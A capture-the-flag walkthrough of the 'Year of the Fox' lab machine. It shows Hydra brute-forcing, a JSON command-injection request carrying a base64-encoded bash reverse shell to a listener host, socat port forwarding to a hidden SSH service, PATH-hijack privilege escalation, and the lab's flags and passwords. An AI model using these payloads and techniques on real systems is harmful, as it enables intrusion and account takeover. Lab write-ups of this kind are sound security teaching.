# Year of the Fox

## Description

Don't underestimate the sly old fox...

Can you get past the wily fox?

## Initial Scan

Let's start with an Nmap scan. The scan reveals three open ports:
* 80 http
* 139 smb
* 445 smb

~~~
PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=You want in? Gotta guess the password!
|_http-title: 401 Unauthorized
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: YEAROFTHEFOX)
Service Info: Hosts: year-of-the-fox.lan, YEAR-OF-THE-FOX

Host script results:
|_clock-skew: mean: 2s, deviation: 0s, median: 1s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: year-of-the-fox
|   NetBIOS computer name: YEAR-OF-THE-FOX\x00
|   Domain name: lan
|   FQDN: year-of-the-fox.lan
|_  System time: 2021-11-14T05:09:03+00:00
|_nbstat: NetBIOS name: YEAR-OF-THE-FOX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2021-11-14T05:09:03
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
~~~

## Network share

First I headed to the webpage, but it requires authorization. The next thing to check is the network share. I used `smbclient` to list the share and there is a share named `yotf`, but we can't have access to it without a password:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Year_of_the_Fox]
└─$ smbclient -L //$IP/      
Enter WORKGROUP\user's password: 

	Sharename       Type      Comment
	---------       ----      -------
	yotf            Disk      Fox's Stuff -- keep out!
	IPC$            IPC       IPC Service (year-of-the-fox server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
                                                                                                                      
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Year_of_the_Fox]
└─$ smbclient  //$IP/yotf
Enter WORKGROUP\user's password: 
tree connect failed: NT_STATUS_ACCESS_DENIED
~~~

Let's run `enum4linux` to find the available users. We found two users: `fox` and `rascal`:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Year_of_the_Fox]
└─$ enum4linux -a $IP

[REDACTED]

 ======================================================================== 
|    Users on 10.10.64.137 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================== 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-978893743-2663913856-222388731
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-22-1-1000 Unix User\fox (Local User)
S-1-22-1-1001 Unix User\rascal (Local User)

[REDACTED]
~~~

We didn't find any passwords, so the only way we have is to brute-force the accounts we found.

## Web

As I checked before, the web service requires authorization. We have two usernames, so let's try to brute-force the passwords.

### Brute-forcing web auth

I used `hydra` to brute-force the passwords for the both users using `rockyou` wordlist and found `rascal`'s password:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Year_of_the_Fox]
└─$ hydra -l rascal -P /usr/share/wordlists/rockyou.txt $IP http-get
Hydra v9.3-dev (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-11-14 00:49:34
[WARNING] You must supply the web page as an additional option or via -m, default path set to /
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-get://10.10.64.137:80/
[STATUS] 2762.00 tries/min, 2762 tries in 00:01h, 14341636 to do in 86:33h, 16 active
[STATUS] 2660.67 tries/min, 7982 tries in 00:03h, 14336416 to do in 89:49h, 16 active
[80][http-get] host: 10.10.64.137   login: rascal   password: laila
1 of 1 target successfully completed, 1 valid password found
~~~

rascal's password: `laila`

* Note: The passwords are randomly generated at boot, so you need to brute-force the password, if the machine is restarted.

### Rascal's Search System

Now that we are logged in, we can see the content of the webpage. There is an input field. I played around with it and found out that it is a search engine that searches for txt files. If you enter an empty string, it will list three files:

<p align="center"><img src="./files/searchEngine.png"></p>

I intercepted the request using `burpsuite` and I realized that the request is sent to a file named `search.php` and our input, is passed in a JSON like string;

<p align="center"><img src="./files/burp.png"></p>

I searched for JSON injection and found [this](https://riptutorial.com/javascript/example/32217/evaled-json-injection). I used burp's repeater to try JSON's injections and was able to run `pwd`:

<p align="center"><img src="./files/burp1.png"></p>

## Reverse shell

I tried to inject a bash reverse shell, but I failed because of the filtering policy. Fortunately by encoding the payload using base64 method, I was able to inject the reverse shell. First create your payload:

~~~
$ echo -n "bash -i >& /dev/tcp/<YOUR IP>/4444 0>&1" | base64         
~~~

Now open a listenr (`rlwrap nc -lvnp 4444`) and send the payload using `burpsuite`. The request should look like the following:

~~~
POST /assets/php/search.php HTTP/1.1
Host: 10.10.64.137
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/plain;charset=UTF-8
Content-Length: 13
Origin: http://10.10.64.137
Authorization: Basic cmFzY2FsOmdhYmJ5MQ==
Connection: close
Referer: http://10.10.64.137/

{"target":"\";echo <YOUR BASE64 ENCODED PAYLOAD> | base64 -d | bash; \""}
~~~

Now we have a shell as `www-data`:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Year_of_the_Fox]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.9.2.77] from (UNKNOWN) [10.10.64.137] 51528
bash: cannot set terminal process group (649): Inappropriate ioctl for device
bash: no job control in this shell
www-data@year-of-the-fox:/var/www/html/assets/php$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

## Web flag

Now we can read the web flag located in `/var/www`:

~~~
www-data@year-of-the-fox:/var/www$ cat web-flag.txt
THM{Nzg2ZWQwYWUwN2UwOTU3NDY5ZjVmYTYw}
~~~

Web flag: `THM{Nzg2ZWQwYWUwN2UwOTU3NDY5ZjVmYTYw}`

## www-dat -> fox

By listing `/home` directory, we can see the users we found in the beginning: `fox` and `rascal`. No need to say that we need to move laterally.

I can remember that there was a file in the web directory named `creds2.txt`. It is an encoded string:

~~~
www-data@year-of-the-fox:/var/www/files$ cat creds2.txt
LF5GGMCNPJIXQWLKJEZFURCJGVMVOUJQJVLVE2CONVHGUTTKNBWVUV2WNNNFOSTLJVKFS6CNKRAX
UTT2MMZE4VCVGFMXUSLYLJCGGM22KRHGUTLNIZUE26S2NMFE6R2NGBHEIY32JVBUCZ2MKFXT2CQ=
~~~

I decoded it first from base32 and then base64, and got a hash which doesn't seem to be useful:

~~~
www-data@year-of-the-fox:/var/www/files$ echo "LF5GGMCNPJIXQWLKJEZFURCJGVMVOUJQJVLVE2CONVHGUTTKNBWVUV2WNNNFOSTLJVKFS6CNKRAXUTT2MMZE4VCVGFMXUSLYLJCGGM22KRHGUTLNIZUE26S2NMFE6R2NGBHEIY32JVBUCZ2MKFXT2CQ=" | base32 -d | base64 -d
c74341b26d29ad41da6cc68feedebd161103776555c21d77e3c2aa36d8c44730  -
~~~

## Hidden SSH

After not finding anything useful, I uploaded `linpeas` to the target machine using a python server on my machine (`python3 -m http.server 80`) and `wget` on the target. Then I marked it as executable and ran it:

~~~
$ cd /tmp
$ wget http://<YOUR IP>/linpeas.sh
$ chmod +x linpeas.sh
$ ./linpeas.sh
~~~

linpeas result shows an SSH service on port 22 which is only available to localhost:

~~~
tcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN      
~~~

Checking `/etc/ssh/sshd_config` confirms this and also tells us that only user `fox` can connect to it:

~~~
www-data@year-of-the-fox:/etc/ssh$ cat sshd_config

[REDACTED]

#Port 22
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::

[REDACTED]

AllowUsers fox
~~~

We can use `socat` to open another port and redirect the traffic to port 22 on localhost. `socat` is not available on the target machine, so let's download its binary from our machine.

First start a server where the binary is located.

On my machine:
~~~
$ which socat
/usr/bin/socat
$ cd /usr/bin
$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
~~~

Now download it on the target machine:

~~~
$ cd /tmp
$ wget http://<YOUR IP>/socat
$ chmod +x socat
~~~

Now we can run it and open a port (I used port 2222) and redirect the traffic to port 22 on localhost:

~~~
www-data@year-of-the-fox:/tmp$ ./socat TCP-LISTEN:2222,fork TCP:127.0.0.1:22
~~~

Then I confirmed that it works using nmap:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Year_of_the_Fox]
└─$ nmap $IP -p2222
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-14 07:15 EST
Nmap scan report for 10.10.64.137
Host is up (0.17s latency).

PORT     STATE SERVICE
2222/tcp open  EtherNetIP-1       <------------
~~~

### Brute-forcing SSH

Now that we have an opne ssh port, we can brute-force the password for user `fox`. I used `hydra` and `rockyou` wordlist:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Year_of_the_Fox]
└─$ hydra -l fox -P /usr/share/wordlists/rockyou.txt ssh://$IP:2222
Hydra v9.3-dev (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-11-14 07:16:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://10.10.64.137:2222/
[STATUS] 177.00 tries/min, 177 tries in 00:01h, 14344222 to do in 1350:41h, 16 active
[STATUS] 165.67 tries/min, 497 tries in 00:03h, 14343902 to do in 1443:03h, 16 active
[2222][ssh] host: 10.10.64.137   login: fox   password: ashlee
1 of 1 target successfully completed, 1 valid password found
~~~

fox's ssh password: `ashlee`

* Note: Again, the passwords are randomly generated at boot, so you need to brute-force the password, if the machine is restarted.

## User flag

Now we can connect to the machine via ssh on port 2222. The user flag is located in fox's home directory:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Year_of_the_Fox]
└─$ ssh fox@$IP -p2222
fox@10.10.64.137's password: 


	__   __                       __   _   _            _____         
	\ \ / /__  __ _ _ __    ___  / _| | |_| |__   ___  |  ___|____  __
	 \ V / _ \/ _` | '__|  / _ \| |_  | __| '_ \ / _ \ | |_ / _ \ \/ /
	  | |  __/ (_| | |    | (_) |  _| | |_| | | |  __/ |  _| (_) >  < 
	  |_|\___|\__,_|_|     \___/|_|    \__|_| |_|\___| |_|  \___/_/\_\


                                                                  
fox@year-of-the-fox:~$ id
uid=1000(fox) gid=1000(fox) groups=1000(fox),114(sambashare)
fox@year-of-the-fox:~$ ls
samba  user-flag.txt
fox@year-of-the-fox:~$ cat user-flag.txt 
THM{Njg3NWZhNDBjMmNlMzNkMGZmMDBhYjhk}
~~~

User flag: `THM{Njg3NWZhNDBjMmNlMzNkMGZmMDBhYjhk}`

## Going root

Now we need to obtain the root flag. I ran `sudo -l` to check my sudo permissions and and we can run `/usr/sbin/shutdown` as root with no password.

~~~
fox@year-of-the-fox:~$ sudo -l
Matching Defaults entries for fox on year-of-the-fox:
    env_reset, mail_badpass

User fox may run the following commands on year-of-the-fox:
    (root) NOPASSWD: /usr/sbin/shutdown
~~~

I downlaoded the binary on my machine and checked it using a disassembler and take a look at it:

~~~c
void main() {
    system("poweroff");
    return;
}
~~~

The code has been written by the author and it relies on the `poweroff` function. This function is called without an absolute path, which creates a vulnerability that we will be able to exploit.

We can copy the bash binary to `/tmp` and name it `shutdown` and change the path to `/tmp` and when we run `shutdown`, the `bash` binary that we copied, will be executed instead and when it is run with sudo as root, we'll get a root shell. The steps are as follows:

~~~
fox@year-of-the-fox:~$ cd /tmp
fox@year-of-the-fox:/tmp$ cp /bin/bash /tmp/poweroff
fox@year-of-the-fox:/tmp$ chmod +x poweroff 
fox@year-of-the-fox:/tmp$ export PATH=/tmp:$PATH
fox@year-of-the-fox:/tmp$ sudo /usr/sbin/shutdown 
root@year-of-the-fox:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
~~~

## Root flag

The root flag is not in `/root` as you expect it to be:

~~~
root@year-of-the-fox:/tmp# cd /root
root@year-of-the-fox:/root# ls
root.txt
root@year-of-the-fox:/root# cat root.txt 
Not here -- go find!
~~~

I used `find` command to find the files with `root` in their name and found the flag in `rascal`'s home directory:

~~~
root@year-of-the-fox:/root# find / -type f -name "*root*"
[REDACTED]
/home/rascal/.did-you-think-I-was-useless.root
root@year-of-the-fox:/root# cat /home/rascal/.did-you-think-I-was-useless.root
T
H
M
{ODM3NTdk
MDljYmM4Z
jdhZWFhY2
VjY2Fk}

Here's the prize:

YTAyNzQ3ODZlMmE2MjcwNzg2NjZkNjQ2Nzc5NzA0NjY2Njc2NjY4M2I2OTMyMzIzNTNhNjk2ODMw
Mwo=

Good luck!
~~~

I decoded the base64 encoded string and it returned a hash, but I don't know what it's about. But we have the root flag.

Root flag: `THM{ODM3NTdkMDljYmM4ZjdhZWFhY2VjY2Fk}`

# D0N3! ; )

Thanks to the creator(s)!

Hope you had fun and learned something.

Have a g00d one! : )